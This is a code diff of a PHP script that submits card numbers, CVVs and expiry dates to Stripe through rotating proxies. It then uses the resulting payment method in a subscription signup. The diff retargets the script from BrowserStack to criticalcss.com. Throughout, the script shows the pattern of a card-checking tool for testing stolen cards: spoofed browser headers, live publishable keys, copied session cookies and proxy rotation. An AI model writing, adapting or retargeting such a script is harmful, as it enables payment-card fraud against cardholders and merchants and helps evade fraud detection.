@@ -112,13 +112,13 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: v1/tokens',
+'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
@@ -139,7 +139,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=99d2b978-9d7b-4583-8b5f-431a8464fcfc84f8ce&muid=0b0fb6c6-1728-4310-bef1-24670791017bae75da&sid=a479c053-1119-46ce-b9af-3b8e2df865f7d66dc5&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=68760&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=33968&key=pk_live_NGJsMv0MLmtsBQknbpBwDYcE');
 
 
 
@@ -151,7 +151,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://accounts.browserstack.com/orders');
+curl_setopt($ch, CURLOPT_URL, 'https://criticalcss.com/api/premium/signup-payment');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -162,16 +162,15 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: accounts.browserstack.com',
+'authority: criticalcss.com',
 'method: POST',
-'path: /orders',
+'path: /api/premium/signup-payment',
 'scheme: https',
-'accept: text/javascript, application/json',
+'accept: application/json',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cf_bm=xbG3Yup.DfnlmqFNXU7n5zZZWoG_nCk6DsLdbwRrvQY-1649091444-0-AV6u5vARX97KjFu0uP8EtOdgyL5Wp6+kfbew0mfw4LB1a2WLGNo+G0skP1kHpEP0yM1zjtQyeamVmsp9vP9TMos=; __cfruid=74fbabc846642bf47a82e189aaa83197c505c884-1649091444; tracking_id=2c05260f-e67b-48be-ad8a-0cc34fa03e1e; moved=1; GAstartTime=1649091515618; bs_deviceId=7621522b-218b-baa9-5f9f-8f1727651bf0; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"8dae17bd-75f3-47e8-b783-f95ac4cda189","60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":134,"48":105,"54":116}; ga_pa_status=npa; _session=b07d01737c4298cdfb870d8deb75dce1; bs_logging_id=5949454; bs_group_id=5866654; bs_user_details={"user_details":{"user_id":5949454,"group_id":5866654},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; show_freshchat=2; GAlastSentTime=1649091696177',
-'origin: https://www.browserstack.com',
-'referer: https://www.browserstack.com/',
+'content-type: application/json',
+//'cookie: ',
+'origin: https://criticalcss.com',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -180,7 +179,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=f2%2BWydzSQdTG5PEm%2FuzM1lr1lscnr%2BqOVghQbBdGQ%2FXaNTTScmb9B%2BVfWXpiZjMV%2BMQ9RXhhgsBKEvc5rK0KRg%3D%3D&is_from_checkout_page=true&stripeToken='.$id.'&cardDetails=null&is_tax_checkout_page=true&is_single_form_checkout=true&authenticity_token=MwGixQYTbjcwTgimYQ2%2FYkRUil1%2F91inuEWNxRJWzIOWWwDeqKfS5BP1oPr9h0Ch5mUh3yA5MOmkXyqQqb2FMA%3D%3D');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"email":"'.$email.'","plan":"price_1HwBoaLYNoSq08J0Q92yIKGh","quantity":1,"customerId":null,"protect":"null","paymentMethodId":"'.$id.'","sp":"null"}');
 
 
 $result2 = curl_exec($ch);
